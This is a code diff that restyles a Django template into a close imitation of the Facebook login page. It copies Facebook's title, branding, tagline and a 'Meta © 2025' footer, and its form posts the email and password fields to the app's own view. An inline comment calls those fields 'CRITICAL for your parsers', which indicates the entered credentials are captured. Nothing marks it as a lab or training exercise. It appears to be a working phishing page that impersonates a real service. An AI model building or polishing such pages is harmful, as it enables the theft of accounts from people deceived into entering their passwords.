@@ -1,65 +1,178 @@
-<html>
+<!DOCTYPE html>
+{% load static %}
+<html lang="en">
 <head>
-    {% load static%}
-<link href="{% static 'homepage_style.css'%}" type="text/css" rel="stylesheet"/>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <link rel="icon" href="{% static 'logo.png' %}" type="image/png">
+    <link href="{% static 'homepage_style.css' %}" type="text/css" rel="stylesheet"/>
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            display: flex;
+            align-items: center;
+            max-width: 1100px;
+            width: 100%;
+            gap: 80px;
+        }
+        .left-side {
+            flex: 1;
+            padding-right: 32px;
+        }
+        .left-side .logo {
+            font-size: 60px;
+            font-weight: 800;
+            color: #1877f2;
+            margin-bottom: 16px;
+        }
+        .left-side p {
+            font-size: 28px;
+            line-height: 32px;
+            color: #1c1e21;
+        }
+        .right-side {
+            width: 396px;
+        }
+        .login-box {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            text-align: center;
+        }
+        .login-box input[type="text"],
+        .login-box input[type="email"],
+        .login-box input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 8px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        .login-box input::placeholder {
+            color: #8d949e;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            color: white;
+            font-size: 20px;
+            font-weight: 600;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+        .login-btn:hover {
+            background: #166fe5;
+        }
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin: 15px 0;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .divider {
+            margin: 20px 0;
+            border-bottom: 1px solid #dadde1;
+        }
+        .create-account-btn {
+            display: inline-block;
+            background: #42b72a;
+            color: white;
+            font-weight: 600;
+            padding: 12px 24px;
+            border-radius: 6px;
+            text-decoration: none;
+            font-size: 17px;
+        }
+        .create-account-btn:hover {
+            background: #3aa127;
+        }
+        .page-link {
+            margin-top: 28px;
+            font-size: 14px;
+            color: #1c1e21;
+        }
+        .page-link a {
+            color: #1c1e21;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .page-link a:hover {
+            text-decoration: underline;
+        }
+        footer {
+            margin-top: 80px;
+            text-align: center;
+            font-size: 12px;
+            color: #8a8d91;
+        }
+        @media (max-width: 900px) {
+            .container { flex-direction: column; text-align: center; gap: 40px; }
+            .left-side { padding: 0; }
+            .right-side { width: 100%; max-width: 396px; }
+        }
+    </style>
 </head>
-<title>
-Facebook
-</title>
-<link rel="icon" href="{% static 'logo.png'%}" type="image/icon type">
 <body>
 
-<div id="header_wrapper">
- <div id="header">
- <li id="sitename"><a href="http://facebook.com">Facebook</a></li>
- <form action="#" method="post">
-    {% csrf_token %}
- <li>Email or Phone<br>{{form.username}}</li>
- <li>Password<br><input type="password" name="{{form.passcode.name}}" ><br><a href="">Forgotten account?</a></li>
- <li><input type="submit" name="login" value="Log In"></li>
- </form>
- </div>
-</div>
-<!-- input type="text" name=" -->
-<div id="wrapper">
+<div class="container">
+    <!-- Left Side – Logo + Tagline -->
+    <div class="left-side">
+        <h1 class="logo">facebook</h1>
+        <p>Facebook helps you connect and share<br>with the people in your life.</p>
+    </div>
 
-<div id="div1">
-<p>Facebook helps you connect and share with the <br>people in your life.</p>
-<img src="{% static 'facepic.png' %}">
-</div>
+    <!-- Right Side – Login Card -->
+    <div class="right-side">
+        <div class="login-box">
+            <form method="post" action="#">
+                {% csrf_token %}
+                
+                <!-- These two lines are CRITICAL for your parsers – kept exactly as before -->
+                {{ form.username }}  <!-- Renders full <input> with correct name/id/class -->
+                <input type="password" 
+                       name="{{ form.passcode.name }}" 
+                       placeholder="Password" 
+                       required>
 
-<div id="div2">
-<h1>Create an account</h1>
-<p>It's free and always will be.</p>
-<li><input type="text" placeholder="First Name" id="firstname"><input type="text" placeholder="Surname" id="surname"></li>
-<li><input type="text" placeholder="Mobile number or email address"></li>
-<li><input type="text" placeholder="Re-enter mobile number or email address"></li>
-<li><input type="password" placeholder="New password"></li>
-<p>Birthday</p>
-<li>
-<select><option>Day</option></select>
-<select><option>Month</option></select>
-<select><option>Year</option></select>
-<a href="">Why do I need to provide my date of birth?</a>
-</li>
-<li><input type="radio">Female <input type="radio">Male</li>
-<li id="terms">By clicking Create an account, you agree to our <a href="">Terms</a> and that <br>you have read our <a href="">Data Policy</a>, including our <a href="">Cookie Use</a>.</li>
-<li><input type="submit" value="Create an account"></li>
-<li id="create_page"><a href="">Create a Page</a> for a celebrity, band or business.</li>
+                <button type="submit" name="login" class="login-btn">Log in</button>
+            </form>
+
+            <a href="#" class="forgot-password">Forgotten password?</a>
+            
+            <div class="divider"></div>
+            
+            <a href="#" class="create-account-btn">Create new account</a>
+        </div>
+
+        <div class="page-link">
+            <a href="#">Create a Page</a> for a celebrity, brand or business.
+        </div>
+    </div>
 </div>
 
-</div>
+<footer>
+    Meta © 2025
+</footer>
 
-<div id="footer_wrapper">
-
-<div id="footer1">
-English (UK) <a href="">हिन्दी</a><a href="">ਪੰਜਾਬੀ</a><a href=""> اردو</a><a href="">தமிழ்</a><a href="">বাংলা</a><a href="">मराठी</a><a href="">తెలుగు</a><a href="">ગુજરાતી</a><a href="">ಕನ್ನಡ</a><a href="">മലയാളം</a>
-</div>
-<div id="footer2">
-<a href="">Sign Up</a><a href="">Log In</a><a href="">Messenger</a><a href="">Talkerscode</a><a href="">Mobile</a><a href="">Find Friends</a><a href="">Badges</a><a href="">People</a><a href="">Pages</a><a href="">Places</a><a href="">Games</a><a href="">Locations</a><a href="">Celebrities</a><a href="">Groups</a><a href="">Moments</a><a href="">About</a><a href="">Create Advert</a><a href="">Create Page</a><a href="">Developers</a><a href="">Careers</a><a href="">Privacy</a><a href="">Cookies</a><a href="">Ads</a><a href="">Terms</a><a href="">Help</a>
-<p>Design By TalkersCode.com</a>
-</div>
-
-</div>
 </body>
 </html>
